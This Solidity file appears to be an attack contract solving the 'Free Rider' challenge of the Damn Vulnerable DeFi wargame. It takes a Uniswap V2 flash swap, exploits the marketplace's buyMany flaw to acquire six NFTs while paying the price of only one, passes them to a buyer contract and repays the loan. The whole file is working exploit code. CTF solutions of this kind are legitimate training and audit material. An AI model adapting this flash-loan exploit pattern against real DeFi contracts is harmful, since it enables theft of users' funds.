// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {WETH9} from "../WETH9.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../free-rider/Interfaces.sol";
import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";

contract FreeRiderAttack is IERC721Receiver {
    address payable internal weth;
    address internal dvt;
    address internal factory;
    address payable internal buyerMarketplace;
    address internal buyer;
    address internal nft;

    constructor(
        address payable _weth,
        address _dvt,
        address _factory,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    ) public {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
    }

    // Uniswap V2 Flash Swap (Have to pay the normal pool trading fee on these)
    function flashSwap(address _borrowToken, uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(_borrowToken, dvt);
        require(pair != address(0x0), "No pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _borrowToken == token0 ? _amount : 0;
        uint256 amount1Out = _borrowToken == token1 ? _amount : 0;

        bytes memory data = abi.encode(_borrowToken, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data); // The data parameter here allows us to do the callback w/out it, it would be a normal swap
        // When data is populated the contract does a callback to UniswapV2Call
    }

    // Flash Swap Callback From Uniswap
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // We use msg.sender here because the pair contract is doing the callback
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        require(msg.sender == pair, "Sender should be pair");
        require(sender == address(this), "Contract needs to initiate tx");

        (address payable borrowToken, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        uint256 fee = ((amount * 3) / 997) + 1; // There a .3% fee
        uint256 amountToRepay = amount + fee;

        uint256 currentBalance = IERC20(borrowToken).balanceOf(address(this));

        // Convert WETH To ETH
        WETH9(borrowToken).withdraw(currentBalance);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 index = 0; index < 6; index++) {
            tokenIds[index] = index;
        }

        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
            tokenIds
        );

        DamnValuableNFT(nft).setApprovalForAll(buyer, true);

        for (uint256 index = 0; index < 6; index++) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this),
                address(buyer),
                index
            );
        }

        (bool success, ) = weth.call{value: 15.1 ether}("");
        require(success, "Weth conversion failed");

        // Pay back flashswap loan
        IERC20(borrowToken).transfer(pair, amountToRepay);
    }

    // Interface required to recieve NFTs in a contract
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
